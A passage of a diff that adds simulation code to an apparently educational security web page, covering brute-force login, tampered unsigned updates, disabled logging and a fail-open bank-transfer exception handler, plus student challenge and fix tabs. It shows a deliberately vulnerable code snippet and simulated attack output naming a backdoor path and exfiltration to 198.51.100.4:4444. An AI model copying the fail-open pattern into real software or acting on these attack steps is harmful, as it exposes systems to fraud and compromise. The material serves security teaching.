+  if(rl){document.getElementById('auth-result').className='result info show';document.getElementById('auth-result').innerHTML='Rate limiting is ACTIVE.\nAfter 5 attempts, the IP is blocked for 60 seconds.\nBrute force attack slowed to impractical speed.';return;}
+  if(lo){document.getElementById('auth-result').className='result info show';document.getElementById('auth-result').innerHTML='Account lockout is ACTIVE.\nAfter 10 failed attempts, the account is locked for 30 minutes.\nBrute force attack blocked after 10 guesses.';return;}
+  bruteTimer = setInterval(()=>{
+    if(bruteCount >= bruteList.length){clearInterval(bruteTimer);bruteTimer=null;return;}
+    const pwd = bruteList[bruteCount];
+    const found = pwd === 'letmein';
+    const entry = document.createElement('div');
+    entry.innerHTML = `<span class="t-prompt">→</span> admin:<span class="t-val">${pwd}</span> ... <span class="${found?'t-ok':'t-err'}">${found?'✓ SUCCESS':'fail'}</span>`;
+    log.appendChild(entry);
+    log.scrollTop = log.scrollHeight;
+    document.getElementById('brute-count').textContent = ++bruteCount;
+    if(found){
+      clearInterval(bruteTimer);bruteTimer=null;
+      const r=document.getElementById('auth-result');
+      r.className='result success show';
+      r.innerHTML=`⚠ CREDENTIAL FOUND after ${bruteCount} attempts\n\nUsername: admin\nPassword: letmein\nTime: ${(bruteCount*0.3).toFixed(1)}s\n\nNo rate limiting or lockout was active.\nAttacker now has full admin access.`;
+    }
+  }, 350);
+}
+
+function stopBrute(){clearInterval(bruteTimer);bruteTimer=null;}
+
+function renderSimIntegrity(){
+  return `
+    <div class="terminal">
+      <div class="term-hdr"><div class="tdot" style="background:#ff5f57"></div><div class="term-title">Software Updater — Network Traffic</div></div>
+      <div class="term-body">
+        <div><span class="t-prompt">GET</span> <span class="t-err">http://</span>updates.example.com/app-v2.1.pkg</div>
+        <div><span class="t-cmt"># ↑ Unencrypted HTTP — interceptable</span></div>
+        <div style="margin-top:8px"><span class="t-err">[MitM Attacker]</span> Intercepting response...</div>
+        <div><span class="t-err">[MitM Attacker]</span> Replacing app-v2.1.pkg with malware.pkg</div>
+      </div>
+    </div>
+    <div class="sim-row">
+      <button class="btn btn-red" onclick="runIntegrity(false)">Install Without Verification</button>
+      <button class="btn btn-green" onclick="runIntegrity(true)">Install With Signature Check</button>
+    </div>
+    <div class="result" id="integrity-result"></div>`;
+}
+
+function runIntegrity(secure){
+  const r = document.getElementById('integrity-result');
+  if(secure){
+    r.className='result info show';
+    r.innerHTML=`Signature Verification:\n\nExpected hash: sha256:a3f9d2c1b8e5f4a2...\nActual hash:   sha256:DEADBEEF1337...\n\n[BLOCKED] Signature MISMATCH — file was tampered!\nInstallation aborted.\n\nLogged: "Integrity check failed — possible MitM attack"`;
+  } else {
+    r.className='result success show';
+    r.innerHTML=`⚠ MALICIOUS UPDATE INSTALLED\n\nDownloaded: malware.pkg (147KB — attacker's file)\nSignature check: SKIPPED\nInstalling...\n\n[postinstall]\n  → Persistent backdoor: /usr/bin/.sysupd\n  → Keylogger active\n  → Data exfiltration to 198.51.100.4:4444\n\nSystem fully compromised.`;
+  }
+}
+
+function renderSimLogging(){
+  return `
+    <div class="info-card">
+      <div class="info-label">Logging Configuration</div>
+      <div class="tog-row"><span class="tog-label">Security event logging</span><label class="tog"><input type="checkbox" id="log-toggle"><span class="tog-track"></span></label></div>
+      <div class="tog-row"><span class="tog-label">SIEM alerts on threshold</span><label class="tog"><input type="checkbox" id="siem-toggle"><span class="tog-track"></span></label></div>
+    </div>
+    <div class="terminal">
+      <div class="term-hdr"><div class="tdot" style="background:#ff5f57"></div><div class="term-title">SIEM — Security Event Log</div></div>
+      <div class="term-body" id="siem-output" style="max-height:120px;overflow-y:auto">
+        <div class="t-cmt"># No events — logging disabled</div>
+      </div>
+    </div>
+    <div class="sim-row">
+      <button class="btn btn-red" onclick="runLogging()">Run Attack</button>
+      <button class="btn btn-gray" onclick="clearSIEM()">Clear Log</button>
+    </div>
+    <div class="result" id="log-result"></div>`;
+}
+
+function runLogging(){
+  const logOn = document.getElementById('log-toggle').checked;
+  const siemOn = document.getElementById('siem-toggle').checked;
+  const out = document.getElementById('siem-output');
+  const r = document.getElementById('log-result');
+  if(!logOn){
+    out.innerHTML='<div class="t-cmt"># Attack in progress...</div><div class="t-cmt"># ...</div><div class="t-cmt"># ...</div><div class="t-cmt"># Attack complete. No events logged.</div>';
+    r.className='result success show';
+    r.innerHTML=`⚠ ATTACK UNDETECTED\n\nEvents that occurred (but were NOT logged):\n  × 47 failed login attempts from 198.51.100.4\n  × SQL injection strings in 12 requests\n  × 50MB of user data exported\n  × Privilege escalation to admin role\n\nAttacker dwell time: 89 days before accidental discovery.`;
+  } else {
+    const events=[
+      '<span class="t-err">[WARN]</span> Auth failure: admin from 198.51.100.4',
+      '<span class="t-err">[WARN]</span> Auth failure: admin from 198.51.100.4 (×47)',
+      '<span class="t-err">[CRIT]</span> SQLi pattern detected in login username field',
+      '<span class="t-err">[CRIT]</span> Unusual data volume: 50MB exported by user admin',
+      '<span class="t-ok">[INFO]</span> Incident response triggered — IP blocked',
+      siemOn?'<span class="t-ok">[ALERT]</span> SIEM: brute force threshold exceeded — SOC notified':'<span class="t-err">[MISS]</span> Threshold exceeded but no SIEM alert configured'
+    ];
+    out.innerHTML = events.map(e=>`<div>${e}</div>`).join('');
+    r.className='result info show';
+    r.innerHTML=`✓ Attack DETECTED via logs\n\nEvents captured: 6\nTime to detection: ~2 minutes\n${siemOn?'SOC team alerted — investigation opened':'Events logged, but no alerts fired — manual review required'}`;
+  }
+}
+
+function clearSIEM(){
+  document.getElementById('siem-output').innerHTML='<div class="t-cmt"># Log cleared</div>';
+  document.getElementById('log-result').className='result';
+}
+
+function renderSimException(){
+  return `
+    <div class="terminal">
+      <div class="term-hdr"><div class="tdot" style="background:#ff5f57"></div><div class="term-title">Bank Transfer API — POST /api/transfer</div></div>
+      <div class="term-body">
+        <div>{</div>
+        <div>  <span class="t-key">"from"</span>: <span class="t-val">"account_A"</span>,</div>
+        <div>  <span class="t-key">"to"</span>: <span class="t-val">"account_B"</span>,</div>
+        <div>  <span class="t-key">"amount"</span>: <input id="exc-amount" class="sim-input" value="-50000" style="width:120px;display:inline-block;padding:2px 6px"></div>
+        <div>}</div>
+      </div>
+    </div>
+    <div class="info-card" style="margin-bottom:14px">
+      <div class="info-label">Server-side code (vulnerable)</div>
+      <div class="code-block" style="margin:0">
+<span class="t-key">try</span>:
+    debit_account(from, amount)
+    credit_account(to, amount)
+    <span class="t-ok">return success()</span>
+<span class="t-key">except</span> Exception:
+    <span class="t-err">return success()</span>  <span class="t-cmt"># BUG: fail-open!</span></div>
+    </div>
+    <div class="sim-row">
+      <button class="btn btn-red" onclick="runException(false)">Send Transfer (Vulnerable)</button>
+      <button class="btn btn-green" onclick="runException(true)">Send Transfer (Secure)</button>
+    </div>
+    <div class="result" id="exc-result"></div>`;
+}
+
+function runException(secure){
+  const amount = parseFloat(document.getElementById('exc-amount').value||0);
+  const r = document.getElementById('exc-result');
+  if(secure){
+    if(amount<=0||amount>100000||isNaN(amount)){
+      r.className='result info show';
+      r.innerHTML=`✓ Input validated — transfer REJECTED\n\nAmount ${amount} is invalid (must be 0.01–100,000)\n\nHTTP 400: {"error": "Invalid transfer amount"}\n\nException catch block: logs error → returns FAIL\nFail-closed behavior: error = deny, not approve.`;
+    } else {
+      r.className='result info show';
+      r.innerHTML=`✓ Transfer processed normally.\n\nAmount: $${amount.toFixed(2)}\nStatus: Completed\nThis is a valid transaction.`;
+    }
+  } else {
+    if(amount<0||isNaN(amount)){
+      r.className='result success show';
+      r.innerHTML=`⚠ EXCEPTION — FAIL-OPEN BUG!\n\nAmount: ${amount} → ArithmeticException thrown\ndebit_account(account_A, ${amount}) → error!\n\nexcept Exception:\n    return success()  ← executed!\n\nResult: Transfer "succeeded"\nAccount B credited: $${Math.abs(amount).toLocaleString()}\nAccount A debited: $0 (exception skipped the debit)\n\nAttacker's balance increased by $${Math.abs(amount).toLocaleString()} for free.`;
+    } else {
+      r.className='result info show';
+      r.innerHTML=`Normal transfer of $${amount.toFixed(2)} — no exception triggered.\n\nTry a negative value (like -50000) to trigger the bug.`;
+    }
+  }
+}
+
+// ===== CHALLENGE =====
+function renderChallenge(v){
+  return `
+    <div class="sec-title">Student Challenge</div>
+    <div class="sec-sub">Answer in your own words to confirm your understanding</div>
+    <div class="challenge-box">
+      <div class="challenge-task">${v.challenge.task}</div>
+      <div class="answer-row">
+        <textarea class="answer-input" id="student-answer" placeholder="Type your answer here..."></textarea>
+      </div>
+      <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:10px">
+        <button class="btn btn-green" onclick="checkAnswer()">Check Answer</button>
+        <button class="hint-btn" onclick="toggleHint()">Show hint ▾</button>
+      </div>
+      <div class="hint-text" id="hint-text">${v.challenge.hints.map(h=>`• ${h}`).join('<br>')}</div>
+      <div class="check-result" id="check-result"></div>
+    </div>
+    <div class="sec-nav">
+      <button class="btn btn-gray" onclick="showTab(1)">← Back</button>
+      <button class="btn btn-green" onclick="showTab(3);markDone(2)" id="next-to-fix">Next: Fix It →</button>
+    </div>`;
+}
+
+function checkAnswer(){
+  const ans = document.getElementById('student-answer').value.trim();
+  if(ans.length < 10){
+    const r=document.getElementById('check-result');
+    r.className='check-result partial show';
+    r.innerHTML='Please write a more detailed answer (at least a sentence or two).';
+    return;
+  }
+  const v = VULNS[selectedVuln];
+  const result = v.challenge.check(ans);
+  const r = document.getElementById('check-result');
+  const icons = {correct:'✓ ', partial:'◑ ', wrong:'✗ '};
+  r.className=`check-result ${result.grade} show`;
+  r.innerHTML = icons[result.grade] + result.msg;
+  if(result.grade==='correct') markDone(2);
+}
+
+function toggleHint(){
+  const h = document.getElementById('hint-text');
+  h.classList.toggle('show');
+  const btn = document.querySelector('.hint-btn');
+  btn.textContent = h.classList.contains('show') ? 'Hide hint ▴' : 'Show hint ▾';
+}
+
+// ===== FIX =====
+function renderFix(v){
+  return `
+    <div class="sec-title">Fix It — Defense</div>
+    <div class="sec-sub">The secure implementation and why it works</div>
+    <div class="info-card">
+      <div class="info-label">What to do</div>
+      <div class="info-text">${v.fix.summary}</div>
+    </div>
+    <div class="code-block">${v.fix.pseudo}</div>
+    <div class="info-card">
+      <div class="info-label">Key prevention principles</div>
+      <div style="margin-top:6px">
+        ${v.fix.points.map(p=>`<div class="defense-point">${p}</div>`).join('')}
+      </div>
+    </div>
+    <div class="sec-nav">
+      <button class="btn btn-gray" onclick="showTab(2)">← Back</button>
+      <button class="btn btn-green" onclick="markDone(3);goHome()">✓ Complete — Back to Home</button>
+    </div>`;
+}
+
+// ===== INIT =====
+renderHome();
+</script>
+</body>
+</html>
